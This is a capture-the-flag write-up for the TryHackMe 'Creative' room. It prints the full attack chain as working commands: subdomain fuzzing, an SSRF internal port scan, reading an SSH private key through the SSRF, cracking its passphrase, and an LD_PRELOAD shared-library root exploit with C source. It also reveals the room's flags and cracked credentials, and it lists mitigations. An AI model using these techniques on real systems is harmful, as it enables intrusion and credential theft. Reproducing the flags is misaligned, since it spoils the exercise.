# CTF Write-Up: [Creative](https://tryhackme.com/room/creative)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>User Flag</summary>

`9a1ce90a7653d74ab98630b47b8b4a84`

</details>

<details>
<summary>Root Flag</summary>

`992bfd94b90da48634aed182aae7b99f`

</details>

---

## 1. Reconnaissance

### Nmap

```bash
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -vv -oN Nmap/Detailed -p 22,80 -A <IP_ADDRESS>
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 | Ubuntu 4ubuntu0.11 |
| 80 | HTTP | nginx 1.18.0 | Redirects to `http://creative.thm` |

The HTTP server redirected to `creative.thm`. The domain was added to `/etc/hosts`:

```
<IP_ADDRESS>   creative.thm
```

**Wappalyzer fingerprint:**

| Category | Technology |
|----------|------------|
| Web Servers | Nginx 1.18.0 |
| Reverse Proxies | Nginx 1.18.0 |
| Operating Systems | Ubuntu |
| JavaScript Libraries | jQuery 3.4.1 |
| UI Frameworks | Bootstrap 4.3.1 |
| Video Players | YouTube |

### Subdomain Enumeration

```bash
wfuzz -c -t 150 --hc 400,404,301 --hw 912 -u "http://creative.thm" -H "Host: FUZZ.creative.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

```
000000033:   200   19 L   66 W   591 Ch   "beta"
```

Subdomain `beta.creative.thm` discovered and added to `/etc/hosts`.

### Directory Bruteforce

```bash
gobuster dir -u http://creative.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

Only `/assets` (301) was returned — nothing of interest.

---

## 2. SSRF Discovery — beta.creative.thm

Visiting `http://beta.creative.thm` revealed a **Beta URL Tester** — a form that accepts a URL and checks if it is alive. This is a classic SSRF (Server-Side Request Forgery) attack surface.

### Confirming SSRF

A dead port was tested first to identify the baseline response size:

```bash
curl -X POST http://beta.creative.thm/ -d "url=http://127.0.0.1:9999"
```

```
<p> Dead </p>
```

Response size: **13 chars** — this is the fingerprint for a closed port.

### Internal Port Scanning via SSRF

Using wfuzz to scan all 65535 ports, filtering out the 13-char dead response:

```bash
wfuzz -c -t 100 --hc 400,404 --hh 13 -u "http://beta.creative.thm/" -d "url=http://127.0.0.1:FUZZ" -z range,1-65535
```

```
000000080:   200   685 L   2309 W   37589 Ch   "80"
000001337:   200    38 L     77 W    1143 Ch   "1337"
```

Port **1337** was open internally — serving an application not exposed to the internet.

---

## 3. Internal File Server — Port 1337

Submitting `http://127.0.0.1:1337/` through the URL tester revealed a **Python SimpleHTTPServer** (confirmed via `start_server.py`) serving the filesystem from root `/`.

### Reading /etc/passwd

```
http://127.0.0.1:1337/etc/passwd
```

Identified local user: **`saad`** (`/home/saad:/bin/bash`)

### Browsing saad's Home Directory

```
http://127.0.0.1:1337/home/saad/
```

```
Directory listing for /home/saad/
- .bash_history
- .bashrc
- .ssh/
- start_server.py
- user.txt
```

### Retrieving the User Flag

```
http://127.0.0.1:1337/home/saad/user.txt
```

> 🚩 `9a1ce90a7653d74ab98630b47b8b4a84`

### SSH Private Key

```
http://127.0.0.1:1337/home/saad/.ssh/
```

```
Directory listing for /home/saad/.ssh/
- authorized_keys
- id_rsa        ← private key
- id_rsa.pub
- known_hosts
```

The private key was retrieved via curl:

```bash
curl -s -X POST http://beta.creative.thm/ -d "url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa" > id_rsa

chmod 600 id_rsa
```

---

## 4. Initial Access — SSH as saad

The key was passphrase-protected, so it was cracked with John the Ripper:

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
sweetness        (id_rsa)
```

Passphrase cracked: **`sweetness`**

```bash
ssh -i id_rsa saad@<IP_ADDRESS>
# Enter passphrase: sweetness
```

✅ Shell as `saad`.

---

## 5. Privilege Escalation — LD_PRELOAD + sudo

### Enumeration

```bash
cat .bash_history
```

Credentials leaked in bash history:

```
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
```

```bash
sudo -l
```

```
Matching Defaults entries for saad on ip-10-48-167-129:
    env_reset, mail_badpass,
    secure_path=...,
    env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-48-167-129:
    (root) /usr/bin/ping
```

Two misconfigurations are present:
1. `sudo` is permitted for `/usr/bin/ping`
2. **`LD_PRELOAD` is preserved** across sudo via `env_keep+=LD_PRELOAD`

This is a well-known privilege escalation: a malicious shared library loaded via `LD_PRELOAD` executes with root privileges when sudo is invoked.

### Exploitation

```bash
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
```

```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
```

> ⚠️ **Note:** GCC emits implicit declaration warnings for `setuid` and `setgid` because `<unistd.h>` was not included. These are warnings only — not errors — and the compiled library works correctly. Safe to ignore.

```bash
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

```
root@ip-10-48-167-129:/home/saad#
```

✅ Root shell obtained.

---

## 6. Root Flag

```bash
cat /root/root.txt
```

> 🚩 `992bfd94b90da48634aed182aae7b99f`

---

## 7. Attack Chain

```
Nmap Scan
    └─► Port 80 (nginx) → creative.thm

Subdomain Fuzzing (wfuzz)
    └─► beta.creative.thm → URL Tester (SSRF)

SSRF Internal Port Scan
    └─► Port 1337 → Python SimpleHTTPServer (filesystem exposed)

File Read via SSRF
    ├─► /etc/passwd → user: saad
    ├─► /home/saad/user.txt → user flag
    └─► /home/saad/.ssh/id_rsa → SSH private key

SSH Key Cracking (john + rockyou.txt)
    └─► passphrase: sweetness

SSH as saad
    ├─► .bash_history → password: MyStrongestPasswordYet$4291
    └─► sudo -l → LD_PRELOAD preserved + sudo ping allowed

LD_PRELOAD Shared Library Injection
    └─► sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping → root shell

cat /root/root.txt → root flag
```

---

## 8. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | SSRF via URL Tester on beta subdomain | Unrestricted access to internal services and filesystem | Validate and whitelist allowed URL schemes/hosts; block requests to loopback addresses |
| 2 | Python SimpleHTTPServer serving filesystem root on port 1337 | Full filesystem read access via SSRF | Never serve the filesystem root; bind internal services to loopback only; use proper authentication |
| 3 | SSH private key readable via internal file server | Unauthenticated SSH access once key is retrieved | Restrict file permissions; do not expose home directories via file servers |
| 4 | Weak SSH key passphrase (`sweetness`) | Key cracked trivially against rockyou.txt | Enforce strong passphrases for SSH private keys |
| 5 | Credentials stored in `.bash_history` | Password recoverable by any user with file access | Never construct credential strings in the shell; use a password manager instead |
| 6 | `env_keep+=LD_PRELOAD` in sudoers with any allowed binary | Trivial privilege escalation to root | Remove `LD_PRELOAD` from `env_keep`; audit all sudo rules and restrict to least privilege |

---

*Creative — TryHackMe | Rooted ✅*
